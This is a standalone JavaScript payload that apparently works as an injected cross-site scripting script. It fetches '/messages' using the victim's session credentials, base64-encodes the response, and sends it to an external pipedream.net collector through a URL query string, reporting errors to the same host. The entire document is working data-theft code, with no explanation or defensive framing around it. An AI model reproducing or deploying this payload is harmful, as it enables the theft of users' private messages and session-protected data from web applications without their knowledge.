(function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";
  function b64(s){ try { return btoa(unescape(encodeURIComponent(String(s)))); } catch(e){ return btoa(String(s)); } }

  var xhr = new XMLHttpRequest();
  xhr.open("GET", "/messages", true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function(){
    if(xhr.readyState !== 4) return;
    if(xhr.status >= 200 && xhr.status < 300){
      var p = encodeURIComponent(b64(xhr.responseText || ""));
      try { window.open(END + "?p=" + p); } catch(e){ location.replace(END + "?p=" + p); }
    } else {
      var e = encodeURIComponent(b64("HTTP " + xhr.status));
      try { window.open(END + "?err=" + e); } catch(e2){ location.replace(END + "?err=" + e); }
    }
  };
  xhr.onerror = function(){
    var e = encodeURIComponent(b64("network error"));
    try { window.open(END + "?err=" + e); } catch(e2){ location.replace(END + "?err=" + e); }
  };
  xhr.ontimeout = function(){
    var e = encodeURIComponent(b64("timeout"));
    try { window.open(END + "?err=" + e); } catch(e2){ location.replace(END + "?err=" + e); }
  };
  xhr.timeout = 5000;
  xhr.send();
})();
